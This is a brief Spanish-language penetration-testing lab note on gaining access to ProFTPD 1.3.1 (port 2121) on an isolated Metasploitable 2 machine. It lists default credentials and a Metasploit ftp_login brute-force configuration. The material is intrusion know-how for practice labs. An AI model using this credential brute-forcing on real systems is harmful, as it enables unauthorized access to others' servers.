# ProFTPD 1.3.1 (puerto 2121) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** un **segundo servidor FTP**, esta vez **ProFTPD 1.3.1**, en el **puerto 2121**.

**Cómo se explota:** la versión 1.3.1 no tiene el famoso fallo `mod_copy` (ese es de la 1.3.5). Aquí la vía es por **credenciales débiles del sistema** (las mismas cuentas que SSH/Telnet) o acceso anónimo si estuviera habilitado.

## Explotación manual (sin Metasploit)

```bash
ftp 192.168.100.9 2121
# Name: msfadmin   Password: msfadmin   (o user/user)
ls
```

## Explotación con Metasploit

```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.100.9
set RPORT 2121
set USER_FILE usuarios.txt
set PASS_FILE passwords.txt
run
```
